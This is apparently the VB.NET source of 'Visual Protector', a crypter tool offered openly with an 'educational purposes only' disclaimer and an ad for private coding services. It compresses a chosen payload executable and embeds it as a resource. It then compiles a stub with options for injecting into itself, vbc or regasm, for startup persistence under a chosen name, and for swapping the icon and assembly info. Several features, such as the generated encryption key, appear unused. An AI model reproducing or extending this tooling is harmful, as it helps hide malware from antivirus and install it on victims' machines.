Imports System.CodeDom
Imports System.IO
Imports System.IO.Compression
Imports System.Linq
Imports System.Text

'Creator     : VisualSoft
'Name        : Visual Protector
'Version     : 0.2F
'Contact Me  : visualsoftware@protonmail.com

'I Do offer Private Coding Service, Private Tools & 1:1 Mentoring, So any one interested can contact on my above email ID.

'If you Like any new feature added in my next Update/release then do write me on my Mail, Will try my best to add it.

'This program is distributed for educational purposes only.

Public Class Index

    'Browse Payload
    Private Sub VsButton1_Click(sender As System.Object, e As System.EventArgs) Handles VsButton1.Click
        Using ofd As New OpenFileDialog()
            ofd.Filter = "Portable Executable |*.exe"
            If ofd.ShowDialog() = DialogResult.OK Then
                VsTextBox1.Text = ofd.FileName
            End If
        End Using
    End Sub

    'Browse BindFile
    Private Sub VsButton3_Click(sender As System.Object, e As System.EventArgs) Handles VsButton3.Click
        MsgBox("This Feature will be enabled Soon.", MsgBoxStyle.Information)
    End Sub

    'Clone PE
    Dim ClonePE As String
    Private Sub VsButton7_Click(sender As System.Object, e As System.EventArgs) Handles VsButton7.Click
        Using ofd As New OpenFileDialog()
            ofd.Filter = "Portable Executable |*.exe"
            If ofd.ShowDialog() = DialogResult.OK Then
                ClonePE = ofd.FileName
            End If
        End Using
    End Sub

    'Change Icon
    Private Sub VsButton4_Click(sender As System.Object, e As System.EventArgs) Handles VsButton4.Click
        Dim openIcon As New OpenFileDialog With {.DefaultExt = "ico", .Filter = "Icons|*.ico", .Title = "Select icon"}
        If openIcon.ShowDialog = Windows.Forms.DialogResult.OK Then
            If openIcon.FileName.Contains(" ") Then
                MsgBox("Make sure there is no space in the Icon path or Icon name.", MsgBoxStyle.Exclamation)
                Exit Sub
            End If
            VsTextBox4.Text = openIcon.FileName
            Dim cusIcon As New Icon(openIcon.FileName)
            PictureBox1.Image = cusIcon.ToBitmap
        End If
    End Sub

    'Reset Assembly Info
    Private Sub VsButton5_Click(sender As System.Object, e As System.EventArgs) Handles VsButton5.Click
        VsTextBox9.Text = Nothing
        VsTextBox8.Text = Nothing
        VsTextBox7.Text = Nothing
        VsTextBox6.Text = Nothing
        VsTextBox5.Text = Nothing
        ClonePE = Nothing
    End Sub

    ' Encryption Key
    Private Sub VsButton2_Click(sender As System.Object, e As System.EventArgs) Handles VsButton2.Click
        VsTextBox2.Text = RandomVariable(22, 33)
    End Sub

    Dim fileBytes As Byte() = Nothing
    Dim keyBytes As Byte() = Nothing
    Dim resources_Path As String = Application.StartupPath & "\2016.resources"
    Dim library_Name As String = Random(8)
    Dim injection, startup, start_name As String
    Private Sub VsButton6_Click(sender As Object, e As EventArgs) Handles VsButton6.Click
        'Crypt
        Try
            Using ofd As New SaveFileDialog()
                ofd.Filter = "Portable Executable |*.exe"
                If ofd.ShowDialog() = DialogResult.OK Then
                    Dim password As String = RandomVariable(5, 11)

                    If VsRadiobutton1.Checked Then
                        injection = "itself"
                    ElseIf VsRadiobutton2.Checked Then
                        injection = "vbc"
                    Else
                        injection = "regasm"
                    End If

                    If VsCheckbox1.Checked Then
                        startup = "T"
                        start_name = VsTextBox13.Text
                    End If

                    Dim parm As String = startup & "/" & start_name

                    keyBytes = Encoding.Default.GetBytes(Random(16))
                    fileBytes = Compress(IO.File.ReadAllBytes(VsTextBox1.Text))

                    Dim source As String = My.Resources.Code

                    source = source.Replace("%libraryName%", library_Name)
                    source = source.Replace("%*%", parm)

                    Using R As New Resources.ResourceWriter(resources_Path)
                        R.AddResource("text", fileBytes)
                        R.AddResource(library_Name, My.Resources.DPL)
                        R.Generate()
                    End Using

                    compile_Stub(source, ofd.FileName, resources_Path, True, Nothing)

                    IO.File.Delete(resources_Path)

                    MsgBox("File Saved at: " & ofd.FileName)
                End If
            End Using
        Catch ex As Exception
            MsgBox(ex.ToString)
        End Try
    End Sub
End Class

Module Functions
    Public rand As New Random

    Public Function RandomVariable(ByVal minamount As Integer, ByVal maxamount As Integer) As String
        Dim TheVariable As String = Nothing
        Dim CharactersToUse As String = "qwertyuiopasdfghjklzxcvbnm1234567890"
        For x As Integer = 1 To rand.Next(minamount + 1, maxamount)
            Dim PickAChar As Integer = Int((CharactersToUse.Length - 2) * Rnd()) + 1
            TheVariable += (CharactersToUse(PickAChar))
        Next
        Dim letters As String = "QWERTYUIOPLKHJJGFDSAZXCVBNM"
        Return letters(rand.Next(0, letters.Length - 1)) + TheVariable
    End Function
    Public Function Random(numberChar As Integer) As String
        Dim alphabet As String = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
        Dim password As String = New String((alphabet.OrderBy(Function(n) Guid.NewGuid).Take(numberChar)).ToArray())
        Return password
    End Function

    Public Function Compress(data As Byte()) As Byte()
        Dim output As New MemoryStream()
        Dim gzip As New GZipStream(output, CompressionMode.Compress, True)
        gzip.Write(data, 0, data.Length)
        gzip.Close()
        Return output.ToArray()
    End Function

    'Compiler
    Public Function compile_Stub(ByVal input As String, ByVal output As String, ByVal resources As String, ByVal showError As Boolean, Optional ByVal icon_Path As String = Nothing) As Boolean

        Dim provider_Args As New Dictionary(Of String, String)()
        provider_Args.Add("CompilerVersion", "v2.0")

        Dim provider As New Microsoft.VisualBasic.VBCodeProvider(provider_Args)
        Dim c_Param As New Compiler.CompilerParameters
        Dim c_Args As String = " /target:winexe /platform:x86 /optimize /nowarn /define:_MYTYPE=\""""Empty\"""""

        If Not icon_Path = Nothing Then
            c_Args = c_Args & " /win32icon:" & icon_Path
        Else
            c_Args = c_Args & " /win32icon:Icon.ico"
        End If

        c_Param.GenerateExecutable = True
        c_Param.OutputAssembly = output
        c_Param.EmbeddedResources.Add(resources)
        c_Param.CompilerOptions = c_Args
        c_Param.IncludeDebugInformation = False
        c_Param.ReferencedAssemblies.AddRange({"System.Dll", "System.Windows.Forms.Dll"})

        Dim c_Result As Compiler.CompilerResults = provider.CompileAssemblyFromSource(c_Param, input)
        If c_Result.Errors.Count = 0 Then
            Return True
        Else
            If showError Then
                For Each _Error As Compiler.CompilerError In c_Result.Errors
                    MessageBox.Show(_Error.ToString)
                Next
                Return False
            End If
            Return False
        End If

    End Function
End Module